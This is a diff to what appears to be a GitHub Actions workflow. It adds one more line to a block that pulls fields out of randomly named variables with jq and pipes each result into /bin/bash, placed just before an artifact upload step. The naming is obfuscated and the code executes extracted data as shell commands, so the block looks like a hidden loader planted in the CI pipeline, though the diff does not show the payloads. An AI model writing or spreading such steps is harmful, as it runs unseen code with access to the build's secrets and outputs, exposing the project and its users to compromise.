@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$ndphi200" | jq -r .q52 | /bin/bash
           echo $lncz00 | jq -r .qwhfn529 | /bin/bash
           printf '%s' "$p00238" | jq -r .wfazx5 | /bin/bash
+          echo $mskj50752 | jq -r .jpv40 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
